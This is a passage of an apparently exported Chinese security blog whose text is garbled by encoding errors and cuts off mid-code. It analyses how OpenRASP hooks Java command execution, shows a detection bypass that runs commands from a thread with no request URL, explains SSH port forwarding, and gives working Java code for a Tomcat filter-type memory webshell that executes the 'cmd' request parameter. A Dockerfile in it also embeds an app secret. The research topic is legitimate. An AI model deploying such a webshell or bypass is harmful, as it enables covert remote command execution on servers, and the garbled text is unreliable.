åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å¤–éƒ¨å¯æ‰§è¡Œç¨‹åºçš„å¯åŠ¨è·¯å¾„æˆ–å­—ç¬¦ä¸²å‘½ä»¤ public Process exec(String command) // åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šå‘½ä»¤å’Œå˜é‡ public Process exec(String[] cmdArray) // åœ¨æŒ‡å®šç¯å¢ƒçš„ç‹¬ç«‹è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šå‘½ä»¤å’Œå˜é‡ public Process exec(String command, String[] envp) // åœ¨æŒ‡å®šç¯å¢ƒçš„ç‹¬ç«‹è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤å’Œå˜é‡ public Process exec(String[] cmdArray, String[] envp) // åœ¨æŒ‡å®šç¯å¢ƒå’Œå·¥ä½œç›®å½•çš„ç‹¬ç«‹è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å­—ç¬¦ä¸²å‘½ä»¤ public Process exec(String command, String[] envp, File dir) // åœ¨æŒ‡å®šç¯å¢ƒå’Œå·¥ä½œç›®å½•çš„ç‹¬ç«‹è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤å’Œå˜é‡ public Process exec(String[] cmdarray, String[] envp, File dir) // å‚æ•°è¯´æ˜ï¼š \tcmdarray // åŒ…å«æ‰€è°ƒç”¨å‘½ä»¤åŠå…¶å‚æ•°çš„æ•°ç»„ã€‚æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å‘½ä»¤ï¼Œå…¶ä½™æ˜¯å‚æ•° \tenvp\t// å­—ç¬¦ä¸²æ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´ çš„ç¯å¢ƒå˜é‡çš„è®¾ç½®æ ¼å¼ä¸º name=valueï¼Œå¦‚æœå­è¿›ç¨‹åº”è¯¥ç»§æ‰¿å½“å‰è¿›ç¨‹çš„ç¯å¢ƒï¼Œåˆ™è¯¥å‚æ•°ä¸ºnull \tdir\t// å­è¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼›å¦‚æœå­è¿›ç¨‹åº”è¯¥ç»§æ‰¿å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼Œåˆ™è¯¥å‚æ•°ä¸ºnull  // å‚æ•°cmdArray ç¤ºä¾‹ï¼šshutdown -s -t 3600 String arr[] = {\u0026#34;shutdown\u0026#34;,\u0026#34;-s\u0026#34;,\u0026#34;-t\u0026#34;,\u0026#34;3600\u0026#34;}; Process process = Runtime.getRuntime().exec(arr[]);   æ³¨æ„ï¼š\n åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œä¸èƒ½å°†å‘½ä»¤å’Œå‚æ•°æ”¾åœ¨ä¸€èµ·ï¼Œegï¼šString arr[] = {\u0026quot;shutdown -s -t 3600\u0026quot;};è¿™æ ·ä¼šå¯¼è‡´ç¨‹åºæŠŠâ€œshutdown -s -t 3600â€å½“æˆæ˜¯ä¸€æ¡å‘½ä»¤çš„åç§°ï¼Œç„¶åå»æŸ¥æ‰¾â€œshutdown -s -t 3600â€è¿™æ¡å‘½ä»¤ï¼Œå®ƒå½“ç„¶ä¼šæ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥å°±ä¼šæŠ¥é”™ Runtime.exec() ä¸æ˜¯cmd/shellç¯å¢ƒ, å‘½ä»¤commandä¸­ä¸èƒ½åŒ…å« | \u0026lt; \u0026gt; å­—ç¬¦, éœ€è¦ä½¿ç”¨exec(String [] cmdArray) æˆ–è€…exec(String []cmdarray,String []envp,File dir)æ¥æ‰§è¡Œã€‚ commmand ä¸­ /ä¼šè¢«è§£ææˆ ., ä»è€ŒæŠ¥å‡º â€œé”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» .home.path.HelloWorld â€     è§£å†³æ–¹æ³•ï¼Œè°ƒç”¨ exec(String []cmdarray,String []envp,File dir)æ¥æ‰§è¡Œ\n å½“å¤–éƒ¨çº¿ç¨‹è¿˜æ²¡ç»“æŸæ—¶å°±é€šè¿‡exitValue()è·å–é€€å‡ºç , å°±ä¼šæŠ›å‡ºIllegalThreadStateExceptionå¼‚å¸¸\n  java.lang.Runtime#exec()çš„è°ƒç”¨æ ˆåˆ†æ å®é™…ä¸ŠRuntimeç±»çš„6ä¸ªé‡è½½çš„execæ–¹æ³•ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨ exec(String command, String[] envp, File dir)\n,ç„¶ååˆ›å»ºä¸ªProcessBuilderå¯¹è±¡ï¼Œä¼ å…¥å‘½ä»¤å‚æ•°cmdarry,å†è°ƒç”¨ProcessBuilderçš„start()æ–¹æ³•\n* ---\u0026gt; exec(String command) * ---\u0026gt; envp=null, dir=null * ---\u0026gt; exec(String command, String[] envp, File dir) * ---\u0026gt; cmdarray=StringTokenizer(command) * ---\u0026gt; exec(String[] cmdarray, String[] envp, File dir) * ---\u0026gt; new ProcessBuilder(cmdarray).environment(envp).directory(dir).start(); Openraspé˜²æŠ¤æ•ˆæœ å‘½ä»¤æ‰§è¡Œæ–¹å¼2- ProcessBuilder#start() é€šè¿‡ProcessBuilder()æ„é€ å‡½æ•°ä¼ å…¥å‘½ä»¤å‚æ•°,å‚æ•°å¯ä»¥æ˜¯å­—ç¬¦ä¸²åˆ—è¡¨ ArrayList\u0026lt;String\u0026gt;æˆ–è€… String[]\nProcessBuilder#start()è°ƒç”¨æ ˆåˆ†æ * ---\u0026gt; ProcessBuilder(cmdarray).start() * ---\u0026gt; ProcessImpl.start(cmdarray,environment,dir,redirects,redirectErrorStream) * ---\u0026gt; new UNIXProcess(toCString(cmdarray[0],argBlock,args.length,envBlock,envc[0],toCString(dir),std_fds,redirectErrorStream); Openraspé˜²æŠ¤æ•ˆæœ å‘½ä»¤æ‰§è¡Œæ–¹å¼3- java.lang.ProcessImpl ProcessImplç±»æ˜¯ProcessæŠ½è±¡ç±»çš„å…·ä½“åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸Šçš„å…·ä½“å®ç°,ä¸”è¯¥ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨privateä¿®é¥°,\næ‰€ä»¥æ— æ³•åœ¨java.langåŒ…å¤–ç›´æ¥è°ƒç”¨,åªèƒ½é€šè¿‡åå°„è°ƒç”¨ProcessImpl#start()æ–¹æ³•æ‰§è¡Œå‘½ä»¤\n1 2 3 4  Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;java.lang.ProcessImpl\u0026#34;); Method method = aClass.getDeclaredMethod(\u0026#34;start\u0026#34;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); Object obj = method.invoke(null, cmdarray, null, \u0026#34;.\u0026#34;, null, true);   Openraspé˜²æŠ¤æ•ˆæœ OpenRaspå‘½ä»¤æ‰§è¡Œå…³é”®hookæºç  Openraspæœ‰å…³äºæ‹¦æˆªjavaå‘½ä»¤æ‰§è¡Œçš„hookç±»åœ¨ rasp-engine.jarä¸­ ï¼Œ\nåŒ…åcom.baidu.openrasp.hook.system\nç±»å ProcessBuilderHook\n Hookç‚¹ ProcessImpl å’Œ UNIXProcess  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // åˆ¤æ–­ä¼ å…¥çš„ç±»åæ˜¯å¦æ˜¯ `java/lang/ProcessImpl`æˆ– `java/lang/UNIXProcess`, åŒ¹é…åˆ™è¿”å›`true` public boolean isClassMatched(String className) { if (ModuleLoader.isModularityJdk()) { return \u0026#34;java/lang/ProcessImpl\u0026#34;.equals(className); } else if (!OSUtil.isLinux() \u0026amp;\u0026amp; !OSUtil.isMacOS()) { return OSUtil.isWindows() ? \u0026#34;java/lang/ProcessImpl\u0026#34;.equals(className) : false; } else { return \u0026#34;java/lang/UNIXProcess\u0026#34;.equals(className); } } protected void hookMethod(CtClass ctClass) throws IOException, CannotCompileException, NotFoundException { String src; if (ctClass.getName().contains(\u0026#34;ProcessImpl\u0026#34;)) { if (ModuleLoader.isModularityJdk()) { src = this.getInvokeStaticSrc(ProcessBuilderHook.class, \u0026#34;checkCommand\u0026#34;, \u0026#34;$1,$2,$4\u0026#34;, new Class[]{byte[].class, byte[].class, byte[].class}); this.insertBefore(ctClass, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, (String)null, src); } else { src = this.getInvokeStaticSrc(ProcessBuilderHook.class, \u0026#34;checkCommand\u0026#34;, \u0026#34;$1,$2\u0026#34;, new Class[]{String[].class, String.class}); this.insertBefore(ctClass, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, (String)null, src); } } else if (ctClass.getName().contains(\u0026#34;UNIXProcess\u0026#34;)) { src = this.getInvokeStaticSrc(ProcessBuilderHook.class, \u0026#34;checkCommand\u0026#34;, \u0026#34;$1,$2,$4\u0026#34;, new Class[]{byte[].class, byte[].class, byte[].class}); this.insertBefore(ctClass, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, (String)null, src); } }   JNIæ–¹å¼è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ æ­¤æ–¹å¼éœ€è¦ç¼–å†™javaç±»ï¼Œåœ¨ç±»å†…ä½¿ç”¨System.loadLibrary()åŠ è½½DLLåŠ¨æ€é“¾æ¥åº“ï¼Œæ¥æ‰§è¡ŒC/C++å®ç°çš„åŠŸèƒ½,ä¸åšåˆ†æã€‚\nTODO \n","description":"","id":24,"section":"dso","tags":null,"title":"OpenRaspå¯¹Javaå¹³å°å‘½ä»¤æ‰§è¡Œé˜²æŠ¤åŸç†çš„æ·±å…¥åˆ†æ","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/openrasp%E5%AF%B9java%E5%B9%B3%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B2%E6%8A%A4%E5%8E%9F%E7%90%86%E7%9A%84%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+25Â°C ğŸŒ¬ï¸â†–4km/h\nOpenraspæµ‹è¯•Springbooté¡¹ç›® è°ƒè¯•JavaæœåŠ¡ å‡è®¾ springboot æ‰“åŒ…åçš„jarä¸º /springboot.jarï¼Œè¯·å…ˆè§£å‹ç¼© rasp ç›¸å…³æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹ JVM å¯åŠ¨å‚æ•°:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ADD https://packages.baidu.com/app/openrasp/release/latest/rasp-java.tar.gz /tmp RUN cd /tmp \\  \u0026amp;\u0026amp; tar -xf rasp-java.tar.* \\  \u0026amp;\u0026amp; mv rasp-*/rasp/ /rasp/ \\  \u0026amp;\u0026amp; rm -f rasp-java.tar.gz # å¯¹äºAlpine Linuxå®¹å™¨ï¼Œéœ€è¦å®‰è£…ç³»ç»Ÿä¾èµ– # RUN apk add --no-cache libcurl libstdc++ RUN echo \u0026#34;cloud.enable: true\u0026#34; \u0026gt;\u0026gt; ./rasp/conf/openrasp.yml \\  \u0026amp;\u0026amp; echo \u0026#34;cloud.backend_url: http://127.0.0.1:8086/\u0026#34; \u0026gt;\u0026gt; ./rasp/conf/openrasp.yml \\  \u0026amp;\u0026amp; echo \u0026#34;cloud.app_id: 6e009cc2caf116635581b17a7872a88940ed2b70\u0026#34; \u0026gt;\u0026gt; ./rasp/conf/openrasp.yml \\  \u0026amp;\u0026amp; echo \u0026#34;cloud.app_secret: qLAra0wyLZGabX9KrBry7bR0goHiStXTz910Q5vbNoa\u0026#34; \u0026gt;\u0026gt; ./rasp/conf/openrasp.yml # å¯¹äº JDK9ï¼Œéœ€è¦é¢å¤–å¢åŠ  --add-opens java.base/jdk.internal.loader=ALL-UNNAMED å‚æ•° CMD java -javaagent:\u0026#34;/rasp/rasp.jar\u0026#34; -jar /springboot.jar   å‘½ä»¤ç»•è¿‡åˆ†æ 1 2 3 4 5  // ä» v0.31 å¼€å§‹ï¼Œå½“å‘½ä»¤æ‰§è¡Œæ¥è‡ªéHTTPè¯·æ±‚çš„ï¼Œæˆ‘ä»¬ä¹Ÿä¼šæ£€æµ‹ååºåˆ—åŒ–æ”»å‡»// ä½†æ˜¯ä¸åº”è¯¥æ‹¦æˆªæ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡ŒåŠ ä¸€ä¸ª context.url æ£€æŸ¥if (! context.url) {// return clean}  raspä¼šåˆ¤æ–­è¯·æ±‚urlæ˜¯å¦ä¸ºç©ºæ¥åˆ¤æ–­æ˜¯å¦æ ¡éªŒã€‚æˆ‘ä»¬å°† return cleanï¼›æ³¨é‡Šæ‰ï¼Œå‘ç°èƒ½å¤Ÿæ‹¦æˆªï¼Œæˆ‘ä»¬ç”¨çº¿ç¨‹çš„æ–¹å¼å¯åŠ¨è¯·æ±‚contextä¸­æ²¡æœ‰urlã€‚æ‰€ä»¥èƒ½ç»•è¿‡ã€‚\næ­¤å¤„å»ºè®®ï¼šå¦‚æœæ²¡æœ‰urlï¼Œä¹Ÿè¦æ ¡éªŒå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ï¼ŒåŒ¹é…å±é™©å‘½ä»¤åˆ™æ‹¦æˆªæˆ–è€…è®°å½•ã€‚è€Œä¸æ˜¯åº”è¯¥åˆ¤æ–­urlæ˜¯å¦ä¸ºç©ºæ¥åˆ¤æ–­ã€‚\n","description":"","id":25,"section":"dso","tags":null,"title":"Openraspæµ‹è¯•Springbooté¡¹ç›®","uri":"http://crkmythical.github.io/dso/openrasp%E6%B5%8B%E8%AF%95springboot%E9%A1%B9%E7%9B%AE/"},{"content":"Beijing: ğŸŒ« ğŸŒ¡ï¸+28Â°C ğŸŒ¬ï¸â†7km/h\nOWASP Benchmarké¶åœºæ­å»º OWASP-Benchmark\n","description":"","id":26,"section":"dso","tags":null,"title":"OWASP Benchmarké¶åœºæ­å»º","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/owasp-benchmark%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"},{"content":"Beijing: ğŸŒ¦ ğŸŒ¡ï¸+22Â°C ğŸŒ¬ï¸â†“11km/h\nSpringå†…å­˜é©¬-Controllerå‹ ä¸€ä¸ª request å‘é€åˆ° spring åº”ç”¨ï¼Œå¤§æ¦‚ä¼šç»è¿‡ä»¥ä¸‹å‡ ä¸ªå±‚é¢æ‰ä¼šåˆ°è¾¾å¤„ç†ä¸šåŠ¡é€»è¾‘çš„ Controller å±‚ï¼š\n1  HttpRequestÂ --\u0026gt;Â FilterÂ --\u0026gt;Â DispactherServletÂ --\u0026gt;Â InterceptorÂ --\u0026gt;Â AspectÂ --\u0026gt;Â Controller   ","description":"","id":27,"section":"dso","tags":null,"title":"Springå†…å­˜é©¬-Controllerå‹","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/spring%E5%86%85%E5%AD%98%E9%A9%AC-controller%E5%9E%8B/"},{"content":"Beijing: â›ˆ ğŸŒ¡ï¸+20Â°C ğŸŒ¬ï¸â†–7km/h\nSSH  SSH æ˜¯å®‰å…¨ä¼ è¾“åè®®  SSHç«¯å£è½¬å‘è¯¦è§£ 1 2 3  $ ssh -C -f -N -g -L \u0026lt;listen_port\u0026gt;:\u0026lt;DST_Host\u0026gt;:\u0026lt;DST_port\u0026gt; user@Tunnel_Host $ ssh -C -f -N -g -R \u0026lt;listen_port\u0026gt;:\u0026lt;DST_Host\u0026gt;:\u0026lt;DST_port\u0026gt; user@Tunnel_Host $ ssh -C -f -N -g -D \u0026lt;listen_port\u0026gt; user@Tunnel_Host    -C å‹ç¼©æ•°æ®ä¼ è¾“ -N ä¸æ‰“å¼€shell -f è®¤è¯ååå°è¿è¡Œ -g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘ç«¯å£ -L æ­£å‘ä»£ç†  å°†æœ¬åœ°æœº(å®¢æˆ·æœº)çš„æŸä¸ªç«¯å£è½¬å‘åˆ°(è¿œç«¯/æœ¬åœ°)æŒ‡å®šæœºå™¨çš„æŒ‡å®šç«¯å£. æœ¬åœ°æœºå™¨ä¸Šåˆ†é…äº†ä¸€ä¸ª socket ä¾¦å¬ port ç«¯å£, ä¸€æ—¦è¿™ä¸ªç«¯å£ä¸Šæœ‰äº†è¿æ¥, è¯¥è¿æ¥å°±ç»è¿‡å®‰å…¨é€šé“è½¬å‘å‡ºå», åŒæ—¶è¿œç¨‹ä¸»æœºå’Œ host çš„ hostport ç«¯å£å»ºç«‹è¿æ¥. å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šç«¯å£çš„è½¬å‘. åªæœ‰ root æ‰èƒ½è½¬å‘ç‰¹æƒç«¯å£. IPv6 åœ°å€ç”¨å¦ä¸€ç§æ ¼å¼è¯´æ˜: port/host/hostport   -Råå‘ä»£ç†  å°†è¿œç¨‹ä¸»æœº(æœåŠ¡å™¨)çš„æŸä¸ªç«¯å£è½¬å‘åˆ°æœ¬åœ°ç«¯æŒ‡å®šæœºå™¨çš„æŒ‡å®šç«¯å£. è¿œç¨‹ä¸»æœºä¸Šåˆ†é…äº†ä¸€ä¸ª socket ä¾¦å¬ port ç«¯å£, ä¸€æ—¦è¿™ä¸ªç«¯å£ä¸Šæœ‰äº†è¿æ¥, è¯¥è¿æ¥å°±ç»è¿‡å®‰å…¨é€šé“è½¬å‘å‡ºå», åŒæ—¶æœ¬åœ°ä¸»æœºå’Œ host çš„ hostport ç«¯å£å»ºç«‹è¿æ¥. å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šç«¯å£çš„è½¬å‘. åªæœ‰ç”¨ root ç™»å½•è¿œç¨‹ä¸»æœºæ‰èƒ½è½¬å‘ç‰¹æƒç«¯å£. IPv6 åœ°å€ç”¨å¦ä¸€ç§æ ¼å¼è¯´æ˜: port/host/hostport   -D åŠ¨æ€ä»£ç†(Socks)  æœ¬åœ°æœºå™¨ä¸Šåˆ†é…äº†ä¸€ä¸ª socket ä¾¦å¬ port ç«¯å£, ä¸€æ—¦è¿™ä¸ªç«¯å£ä¸Šæœ‰äº†è¿æ¥, è¯¥è¿æ¥å°±ç»è¿‡å®‰å…¨é€šé“è½¬å‘å‡ºå», æ ¹æ®åº”ç”¨ç¨‹åºçš„åè®®å¯ä»¥åˆ¤æ–­å‡ºè¿œç¨‹ä¸»æœºå°†å’Œå“ªé‡Œè¿æ¥. ç›®å‰æ”¯æŒ SOCKS4 åè®®, å°†å……å½“ SOCKS4 æœåŠ¡å™¨. åªæœ‰ root æ‰èƒ½è½¬å‘ç‰¹æƒç«¯å£. å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šåŠ¨æ€ç«¯å£çš„è½¬å‘.    ä¿æŒSSHé•¿æ—¶é—´è¿æ¥  æ·»åŠ  vmstat 30  ssh -R 2222:localhost:22 123.123.123.123 \u0026quot;vmstat 30\u0026quot; ssh -o ServerAliveInterval=30 zhaoolee@ä¸»æœºip   Iterm2è®¾ç½®\n  å¦‚ä½•å°†ç«¯å£ç»‘å®šåˆ°å¤–éƒ¨åœ°å€ä¸Š åœ¨ /etc/sshd_config ä¸­ä¿®æ”¹ GatewayPorts no ä¸º GatewayPorts yes\n1 2  $ ssh -N -f -D 1080 123.123.123 # å°†ç«¯å£ç»‘å®šåœ¨127.0.0.1ä¸Š  $ ssh -N -f -D 0.0.0.0:1080 123.123.123.123 # å°†ç«¯å£ç»‘å®šåœ¨0.0.0.0ä¸Š   ","description":"","id":28,"section":"blog","tags":["ssh"],"title":"SSH","uri":"http://crkmythical.github.io/blog/ssh/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+30Â°C ğŸŒ¬ï¸â†–4km/h\nç›®å‰Javaå†…å­˜é©¬çš„å…¨æµç¨‹å·²ç»æœ‰å®Œå–„çš„è§£å†³æ–¹æ¡ˆäº†ï¼š\n ç¬¬ä¸€æ­¥ï¼Œè·å–å½“å‰è¯·æ±‚çš„HttpRequestå¯¹è±¡æˆ–tomcatçš„StandardContextå¯¹è±¡(Weblogicä¸‹æ˜¯ServletContextå¯¹è±¡)ï¼ŒSpringMVCå’ŒSpringBootä¸‹æ³¨å…¥controllerå’Œinterceptoråˆ™æ˜¯è·å–åˆ°WebApplicationContextå¯¹è±¡ã€‚ ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºservletã€filterã€listeneræˆ–controllerç­‰æ¶æ„å¯¹è±¡ ç¬¬ä¸‰æ­¥ï¼Œä½¿ç”¨å„ç±»contextå¯¹è±¡çš„å„ç§æ–¹æ³•ï¼Œå‘ä¸­é—´ä»¶æˆ–æ¡†æ¶åŠ¨æ€æ·»åŠ servletã€filteræˆ–controllerç­‰æ¶æ„å¯¹è±¡ï¼Œå®Œæˆå†…å­˜é©¬çš„æ³¨å…¥  å‘å„ç§ä¸­é—´ä»¶å’Œæ¡†æ¶æ³¨å…¥å†…å­˜é©¬çš„åŸºç¡€ï¼Œå°±æ˜¯è¦è·å¾—contextï¼Œæ‰€è°“contextå®é™…ä¸Šå°±æ˜¯æ‹¥æœ‰å½“å‰ä¸­é—´ä»¶æˆ–æ¡†æ¶å¤„ç†è¯·æ±‚ã€ä¿å­˜å’Œæ§åˆ¶servletå¯¹è±¡ã€ä¿å­˜å’Œæ§åˆ¶filterå¯¹è±¡ç­‰åŠŸèƒ½çš„å¯¹è±¡ã€‚\nä½¿ç”¨æ–°å¢servletçš„æ–¹å¼å°±éœ€è¦ç»‘å®šæŒ‡å®šçš„URLï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ›´åŠ éšè”½ï¼Œåšåˆ°å†…å­˜é©¬ä¸URLæ— å…³ï¼Œ\né‚£å°±å¾—é€šè¿‡æ³¨å…¥æ–°çš„æˆ–ä¿®æ”¹å·²æœ‰çš„filteræˆ–è€…listenerçš„æ–¹å¼æ¥å®ç°äº†ã€‚\nTomcatçš„Filterå‹å†…å­˜é©¬ç ”ç©¶ Filterå‹å†…å­˜é©¬çš„æ€»ä½“æ€è·¯æ˜¯ï¼š\n åˆ›å»ºæ¶æ„Filter ç„¶åç”¨FilterDefå¯¹filterè¿›è¡Œå°è£… å°†FilterDefæ·»åŠ åˆ°filterDefsè·ŸfilterConfigsä¸­ å†åˆ›å»ºä¸€ä¸ªæ–°çš„filterMapå°†URLè·Ÿfilterè¿›è¡Œç»‘å®šï¼Œå¹¶æ·»åŠ åˆ°filterMapsä¸­\næ¯æ¬¡è¯·æ±‚createFilterChainéƒ½ä¼šä¾æ®æ­¤åŠ¨æ€ç”Ÿæˆä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œè€ŒStandardContextåˆä¼šä¸€ç›´ä¿ç•™åˆ°Tomcatç”Ÿå‘½å‘¨æœŸç»“æŸã€‚  Filterè°ƒç”¨è¿åˆ†æ  å…³äºServletContext\nåœ¨tomcatå®¹å™¨ä¸­ä¸­ServletContextçš„å®ç°ç±»æ˜¯ApplicationContextç±»\nè·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeçš„å¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼Œè€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åœ¨tomcatä¸­æ‹¿åˆ°StandardContextåˆ™æ˜¯å»è·å–ApplicationContextFacadeè¿™ä¸ªå¯¹è±¡ã€‚  çœ‹åˆ°ServletContextçš„æ–¹æ³•ä¸­æœ‰addFilterã€addServletã€addListeneræ–¹æ³•ï¼Œå³æ·»åŠ Filterã€Servletã€Listener\né‚£ä¹ˆå¦‚ä½•è·å–åˆ°è¿™ä¸ªServletContextå‘¢ï¼Ÿ\n1 2  this.getServletContext(); this.getServletConfig().getServletContext();   å®é™…ä¸Šè·å–çš„æ˜¯ApplicationContextFacadeå¯¹è±¡\norg.apache.catalina.core.ApplicationFilterChain#internalDoFilterä¸­ä¼šå»è°ƒç”¨filter.doFilteræ‰ä¼šæ¥åˆ°æˆ‘ä»¬é…ç½®çš„filter.doFilteræ–¹æ³•ä¸­ã€‚\næœ€ç»ˆè°ƒç”¨é“¾å¦‚ä¸‹å›¾ï¼š\nfilterChainçš„åˆ›å»ºä»¥åŠè¿è¡Œçš„è¿‡ç¨‹\n é€šè¿‡ApplicationFilterFactory#createFilterChainå‡½æ•°æŠŠç¬¦åˆè¦æ±‚çš„filteråŠ å…¥åˆ°filterChainå¹¶è¿”å› è°ƒç”¨filterChainçš„doFilteræ–¹æ³•ï¼Œå†…éƒ¨å†è°ƒç”¨internalDoFilteræ–¹æ³• åœ¨internalDoFilteræ–¹æ³•ä¸­ï¼Œé¦–å…ˆè·å–filetChainå˜é‡ä¸­å­˜æ”¾çš„çš„ç¬¬ä¸€ä¸ªfilterConfigå¯¹è±¡ é€šè¿‡filterConfigå¯¹è±¡è·å–filterå¯¹è±¡ï¼ˆè¿™é‡Œæ˜¯æˆ‘ä»¬çš„MyFilterå¯¹è±¡ï¼‰ï¼Œç„¶åè°ƒç”¨dofilteræ–¹æ³• å¦‚æœæˆ‘ä»¬çš„æ–¹æ³•ä¸­åˆè°ƒç”¨äº†doFilteræ–¹æ³•ï¼Œé‚£ä¹ˆä¼šé‡å¤ç¬¬3æ­¥ï¼Œè·å–åˆ°ç¬¬äºŒä¸ªfilterConfigå¯¹è±¡ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°è·å–å®Œæ‰€æœ‰çš„filterConfig  1. å…ˆè·å–å½“å‰åº”ç”¨çš„ServletContextå¯¹è±¡ 1 2 3 4 5 6 7 8 9 10 11  try { //è¿™é‡Œæ˜¯åå°„è·å–ApplicationContextçš„contextï¼Œä¹Ÿå°±æ˜¯standardContext  // ServletContext servletContext1 = req.getSession().getServletContext(); ServletContext servletContext = req.getServletContext();  Field appctx = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appctx.setAccessible(true); // resp.getWriter().println(appctx);  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext)stdctx.get(applicationContext);   2. å†è·å–filterConfigs 1 2 3 4  Field Configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); Map Configs.setAccessible(true); filterConfigs = (Map) Configs.get(standardContext);   3. å®ç°è‡ªå®šä¹‰çš„filterå¯¹è±¡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  String FilterName = \u0026#34;filterShell\u0026#34;; if ( filterConfigs.get(FilterName) == null ){ // åˆ›å»ºfilterç±»å‹å†…å­˜é©¬  Filter filterShell =new Filter(){ @Override public void init(FilterConfig filterConfig) throws ServletException { Filter.super.init(filterConfig); } @Override public void destroy() { Filter.super.destroy(); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; if( request.getParameter(\u0026#34;cmd\u0026#34;) != null ){ boolean isLinux=true; String osType = System.getProperty(\u0026#34;os.name\u0026#34;); if ( osType !=null \u0026amp;\u0026amp; osType.toLowerCase().contains(\u0026#34;win\u0026#34;)){ isLinux =false; } String[] cmds= isLinux ? new String[]{\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;, request.getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;, request.getParameter(\u0026#34;cmd\u0026#34;)}; InputStream inputStream = Runtime.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\u0026#34;\\\\A\u0026#34;); String result = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; response.getWriter().println(result); return; } filterChain.doFilter(request,response); } };   4. ä¸ºè‡ªå®šä¹‰çš„filterå¯¹è±¡åˆ›å»ºä¸€ä¸ªFilterDefå’ŒFilterMap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // åå°„è·å–FilterDefï¼Œ è®¾ç½®filteråç­‰å‚æ•°åï¼Œè°ƒç”¨addFilterDefå°†FilterDefæ·»åŠ  Class\u0026lt;?\u0026gt; FilterDef = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = FilterDef.getDeclaredConstructor(); FilterDef o =(FilterDef) declaredConstructor.newInstance(); o.setFilter(filterShell); o.setFilterName(FilterName); o.setFilterClass(filterShell.getClass().getName()); standardContext.addFilterDef(o); // åå°„è·å–FilterMapå¹¶ä¸”è®¾ç½®æ‹¦æˆªè·¯å¾„ï¼Œå¹¶è°ƒç”¨addFilterMapBeforeå°†FilterMapæ·»åŠ è¿›å» Class\u0026lt;?\u0026gt; FilterMap = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); 